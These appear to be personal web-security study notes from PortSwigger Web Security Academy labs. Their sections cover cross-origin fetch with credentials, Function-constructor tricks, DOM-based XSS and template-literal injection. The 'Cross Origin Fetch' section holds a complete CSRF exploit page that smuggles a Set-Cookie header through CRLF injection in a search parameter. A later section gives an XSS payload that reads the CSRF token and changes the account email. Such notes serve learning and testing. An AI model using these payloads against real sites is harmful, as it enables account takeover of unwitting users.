## Javascript `.replace()` function

When a string value is supplied into the first argument of the .replace function, only the first instance is replaced. For all instances to be replaced, a regex expression should be used instead. 

## Cross Origin Fetch

<html>

<body>
   <form action="https://0a7f00fb032c60acc081262c002f0020.web-security-academy.net/my-account/change-email"
        method="POST">
        <input type="hidden" name="email" value="pwned@devil-user.net" />
        <input required type=hidden name=csrf value=UQD7XpBP9tbqqj6cClHK2PFJdPLDPa59>
    </form>
    <script>
        fetch("https://0a7f00fb032c60acc081262c002f0020.web-security-academy.net/?search=t%3b%0d%0aSet-Cookie%3a%20csrfKey%3dxgOkcu96eiZT19WRsMmvwQwLrTposCsA%3b%20SameSite%3dNone", {
            mode:"no-cors",
            credentials: "include"
        }).then(function(response) {
            fetch('https://0a7f00fb032c60acc081262c002f0020.web-security-academy.net/my-account/change-email', {
                method: 'POST',
                mode:"no-cors",
                credentials: "include",
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded',
                },
                body: 'email=pwned%40evil-user.net&csrf=UQD7XpBP9tbqqj6cClHK2PFJdPLDPa59'
            }).then(function(response) {
                console.log(response);
            });
        });
    </script>
</body>

</html>
To allow Fetch to perform cross origin requests while still including cookies in the request, you must specify `ceredentials: 'include'`. For instance, 

```js
fetch('https://example.com:1234/users', {
  credentials: 'include'
})
```

This is necessary to perform attacks like CSRF where it requires your attacker site to perform cross-origin requests using the victim's cookies. This also applies to fetch requests used to set cookies on a different origin. 

## Constructor Class

Each function object has a constructor object that created the function. The constructor of the constructor object hence has the ability to create functions. For example, 

```js
const foo = Function('alert(1)'); // creates a function foo that executes alert(1)
const bar = func.constructor.constructor('alert(2)'); // references the constructor.constructor function to create another function bar
```


## Inspector vs Source

In most cases, viewing source directly through Burp Repeater or `Ctrl+u` is more reliable as you're able to see the unprocessed HTML. This is makes it easier to distinguished whether you have escaped whatever context. Using inspector would show the processed output after the browser tries to correct intentionally wrong HTML syntax. 

However, when it comes to DOM-based XSS which uses javascript to populate the DOM `onload`, viewing source would not allow you to see the changes made by javascript. In this scenario, inspector is more suitable. 

## Waiting for DOM to load

After obtaining XSS via script injection, you might have to wait till the DOM loads to access elements within the DOM. To do so, you might have to use an event listener such as the following. 

```js
<script>
document.addEventListener("DOMContentLoaded", function() { 
	const formData ={ 
		'csrf': document.querySelector('input[name="csrf"]').value,
		'email': 'email@email.com'
	};
	fetch('/my-account/change-email', {
		method:'POST', 
		body: formData,
	});
});
</script>
```

## Eval with backticks

Backticks in JS represent template strings. If there is an input is reflected in a template string, you can execute javascript with `${<js expression>}`. Template literals have normal strings along with placeholders (embedded expressions). 
